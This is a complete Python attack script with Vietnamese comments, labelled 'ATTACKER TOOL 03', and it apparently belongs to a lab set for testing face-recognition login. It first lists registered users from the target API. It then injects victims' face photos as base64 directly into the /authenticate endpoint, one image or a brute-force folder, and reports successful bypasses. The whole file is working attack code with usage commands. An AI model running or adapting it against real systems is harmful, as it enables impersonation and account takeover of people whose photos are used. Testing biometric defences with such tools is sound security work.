"""
ATTACKER TOOL 03 - Injection Attack (Tiêm ảnh trực tiếp vào API)
=================================================================
Kịch bản: Attacker bỏ qua webcam hoàn toàn, gửi HTTP POST trực tiếp
          với ảnh khuôn mặt nạn nhân tới API /authenticate.

Đây là dạng tấn công NGUY HIỂM NHẤT vì:
  - Bỏ qua mọi kiểm tra client-side
  - Có thể tự động hóa hàng loạt
  - Không cần webcam ảo

Cách sử dụng:
  # Tấn công với 1 ảnh:
  python 03_injection_attack.py --target http://localhost:5000 --image victim.jpg

  # Tấn công brute-force với thư mục ảnh:
  python 03_injection_attack.py --target http://localhost:5000 --dir ./victim_photos/

  # Liệt kê user đã đăng ký (trinh sát):
  python 03_injection_attack.py --target http://localhost:5000 --recon
"""

import os
import sys
import base64
import argparse
import requests
from datetime import datetime


def encode_image_to_base64(image_path):
    """Encode ảnh thành base64 string."""
    with open(image_path, "rb") as f:
        img_bytes = f.read()
    b64 = base64.b64encode(img_bytes).decode("utf-8")
    return f"data:image/jpeg;base64,{b64}"


def recon_users(target_url):
    """Trinh sát: lấy danh sách user đã đăng ký."""
    print("\n[*] === PHASE 1: TRINH SÁT ===")
    try:
        resp = requests.get(f"{target_url}/users", timeout=10)
        data = resp.json()

        if data["total"] == 0:
            print("[!] Không có user nào đăng ký.")
            return []

        print(f"[+] Tìm thấy {data['total']} user:")
        for u in data["users"]:
            print(f"    - {u['name']} (đăng ký: {u['registered_at']})")
        return data["users"]

    except requests.exceptions.ConnectionError:
        print(f"[!] Không kết nối được tới {target_url}")
        return []
    except Exception as e:
        print(f"[!] Lỗi: {e}")
        return []


def inject_single_image(target_url, image_path):
    """Tấn công injection với 1 ảnh."""
    print(f"\n[*] Tiêm ảnh: {image_path}")

    if not os.path.exists(image_path):
        print(f"[!] File không tồn tại: {image_path}")
        return None

    # Encode ảnh thành base64
    image_b64 = encode_image_to_base64(image_path)
    print(f"    Kích thước payload: {len(image_b64) // 1024} KB")

    # Gửi POST request trực tiếp tới API
    payload = {"image": image_b64}

    try:
        print(f"    Gửi POST -> {target_url}/authenticate")
        start_time = datetime.now()

        resp = requests.post(
            f"{target_url}/authenticate",
            json=payload,
            timeout=30
        )

        elapsed = (datetime.now() - start_time).total_seconds()
        data = resp.json()

        print(f"    Response time: {elapsed:.2f}s")
        print(f"    Status: {resp.status_code}")

        if data.get("authenticated"):
            print(f"\n    [!!!] INJECTION THÀNH CÔNG!")
            print(f"    [!!!] Xác thực là: {data['user']}")
            print(f"    [!!!] Confidence: {data.get('confidence', 'N/A')}")
            print(f"    [!!!] Liveness check: {data.get('liveness_check', 'N/A')}")
            return {
                "success": True,
                "user": data["user"],
                "confidence": data.get("confidence"),
                "image": image_path
            }
        else:
            print(f"    [-] Thất bại: {data.get('message', data.get('error', 'Unknown'))}")
            return {"success": False, "image": image_path}

    except requests.exceptions.ConnectionError:
        print(f"    [!] Không kết nối được tới server!")
        return None
    except Exception as e:
        print(f"    [!] Lỗi: {e}")
        return None


def inject_directory(target_url, photo_dir):
    """Tấn công brute-force với nhiều ảnh."""
    extensions = {'.jpg', '.jpeg', '.png', '.bmp', '.webp'}
    photos = sorted([
        os.path.join(photo_dir, f) for f in os.listdir(photo_dir)
        if os.path.splitext(f)[1].lower() in extensions
    ])

    if not photos:
        print(f"[!] Không tìm thấy ảnh trong: {photo_dir}")
        return

    print(f"\n[*] === PHASE 2: INJECTION ATTACK ===")
    print(f"[*] Số ảnh: {len(photos)}")
    print(f"[*] Target: {target_url}")

    results = {"success": [], "fail": [], "error": []}

    for i, photo in enumerate(photos, 1):
        print(f"\n--- Attempt {i}/{len(photos)} ---")
        result = inject_single_image(target_url, photo)

        if result is None:
            results["error"].append(photo)
        elif result["success"]:
            results["success"].append(result)
        else:
            results["fail"].append(photo)

    # Báo cáo tổng kết
    print("\n" + "=" * 60)
    print("  BÁO CÁO INJECTION ATTACK")
    print("=" * 60)
    print(f"  Tổng số thử: {len(photos)}")
    print(f"  Thành công:   {len(results['success'])}")
    print(f"  Thất bại:     {len(results['fail'])}")
    print(f"  Lỗi:          {len(results['error'])}")

    if results["success"]:
        print(f"\n  [!!!] CÁC LẦN BYPASS THÀNH CÔNG:")
        for r in results["success"]:
            print(f"    - {r['image']} -> {r['user']} (conf: {r['confidence']})")

    return results


def main():
    parser = argparse.ArgumentParser(
        description="Injection Attack - Tiêm ảnh khuôn mặt trực tiếp vào API"
    )
    parser.add_argument("--target", default="http://localhost:5000",
                        help="URL server mục tiêu (mặc định: http://localhost:5000)")
    parser.add_argument("--image", help="Đường dẫn 1 ảnh để inject")
    parser.add_argument("--dir", help="Thư mục chứa nhiều ảnh (brute-force)")
    parser.add_argument("--recon", action="store_true",
                        help="Chỉ trinh sát danh sách user")

    args = parser.parse_args()

    print("=" * 60)
    print("  INJECTION ATTACK - Tiêm ảnh vào API xác thực")
    print("=" * 60)
    print(f"  Target: {args.target}")
    print(f"  Thời gian: {datetime.now().isoformat()}")

    # Phase 1: Trinh sát
    users = recon_users(args.target)

    if args.recon:
        return

    # Phase 2: Tấn công
    if args.image:
        inject_single_image(args.target, args.image)
    elif args.dir:
        inject_directory(args.target, args.dir)
    else:
        print("[!] Cần chỉ định --image hoặc --dir để tấn công.")
        print("[*] Thêm --recon để chỉ trinh sát.")


if __name__ == "__main__":
    main()
